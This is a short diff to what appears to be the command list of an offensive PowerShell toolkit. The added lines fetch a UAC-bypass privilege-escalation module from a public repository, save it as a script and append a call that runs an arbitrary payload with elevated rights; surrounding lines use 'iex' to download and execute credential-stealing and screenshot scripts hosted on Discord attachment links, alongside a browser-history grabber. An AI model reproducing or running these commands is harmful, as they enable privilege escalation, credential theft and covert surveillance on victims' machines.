@@ -7,6 +7,10 @@ Usage: (-History) : Out-File -FilePath ./histroy.ps1 -InputObject (Invoke-WebReq
      echo "Finished."
      Add-Content ./histroy.ps1 "Get-BrowserInformation"
 
+Usage: (-bypshell") : Out-File -FilePath ./pbypshell.ps1 -InputObject (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/privesc/Invoke-WScriptBypassUAC.ps1").content -Encoding UTF8 
+     Timeout /T 1
+     Add-Content ./pbypshell.ps1 "Invoke-WScriptBypassUAC -payload '{cmdxx}'"
+
 Usage: (-creds) : iex ((New-Object System.Net.WebClient).DownloadString('https://cdn.discordapp.com/attachments/939931011838509090/951960825093058631/CRED.ps1'))
 				
 Usage: (-screenshot) : iex ((New-Object System.Net.WebClient).DownloadString('https://cdn.discordapp.com/attachments/939931011838509090/946619974846382100/screenshot.ps1'))
